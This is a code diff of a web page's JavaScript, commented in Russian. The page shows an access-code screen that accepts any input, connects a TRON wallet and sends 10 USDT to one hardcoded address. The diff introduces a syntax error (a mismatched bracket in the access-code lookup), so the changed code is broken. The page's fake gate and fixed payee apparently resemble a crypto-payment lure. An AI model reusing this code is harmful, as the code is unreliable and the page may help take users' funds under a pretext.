@@ -33,17 +33,14 @@
     </div>
 
     <script>
-        // Адрес получателя, указанный для этого сайта
         const recipientAddress = "TGwPm9pCp1GzCavKLyhX54kqSQbUEZ7Uf";
-        // Официальный контракт USDT (TRC20)
         const usdtContractAddress = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 
         let userTronWeb = null;
         let connectedAccount = "";
 
-        // Проверка кода доступа
         document.getElementById('checkCodeBtn').addEventListener('click', function() {
-            const code = document.getElementById('accessCode').value;
+            const code = document.getElementById('accessCode'].value;
             if (code.trim() !== "") {
                 document.getElementById('authScreen').style.display = 'none';
                 document.getElementById('mainScreen').style.display = 'block';
@@ -52,15 +49,18 @@
             }
         });
 
-        // Подключение кошелька
+        // Надежное подключение с длительным ожиданием внедрения объекта
         document.getElementById('connectBtn').addEventListener('click', async function() {
             try {
-                let tron = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb);
-
-                for (let i = 0; i < 10; i++) {
-                    if (tron && tron.defaultAddress && tron.defaultAddress.base58) break;
+                let tron = null;
+                
+                // Опрашиваем окружение до 20 раз (около 6 секунд), пока кошелек передает данные
+                for (let i = 0; i < 20; i++) {
+                    tron = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb) || (window.ethereum && window.ethereum.tronWeb);
+                    if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
+                        break;
+                    }
                     await new Promise(resolve => setTimeout(resolve, 300));
-                    tron = window.tronWeb || (window.trustwallet && window.trustwallet.tronWeb);
                 }
 
                 if (tron && tron.defaultAddress && tron.defaultAddress.base58) {
@@ -69,7 +69,7 @@
                     document.getElementById('walletAddress').innerText = "Подключено: " + connectedAccount;
                     alert("Успешно подключено!");
                 } else {
-                    alert("Сеть TRON не обнаружена. Убедитесь, что предварительно открыли вкладку USDT (Tron) в кошельке перед запуском сайта в браузере.");
+                    alert("Не удалось получить доступ к TRON. Убедитесь, что вы зашли через вкладку USDT (Tron) в кошельке.");
                 }
             } catch (error) {
                 console.error(error);
@@ -77,7 +77,7 @@
             }
         });
 
-        // Прямой перевод USDT (TRC20) на указанный адрес
+        // Перевод USDT с конвертацией адреса
         document.getElementById('transferBtn').addEventListener('click', async function() {
             if (!connectedAccount || !userTronWeb) {
                 alert("Сначала подключите кошелек!");
@@ -86,11 +86,7 @@
 
             try {
                 const contract = await userTronWeb.contract().at(usdtContractAddress);
-                
-                // Сумма перевода (6 знаков после запятой). Пример: "10000000" = 10 USDT.
-                const amount = "10000000"; 
-
-                // Конвертируем адрес получателя в HEX-формат для контракта
+                const amount = "10000000"; // 10 USDT
                 const recipientHex = userTronWeb.address.toHex(recipientAddress);
 
                 alert("Подтвердите транзакцию перевода в вашем кошельке...");
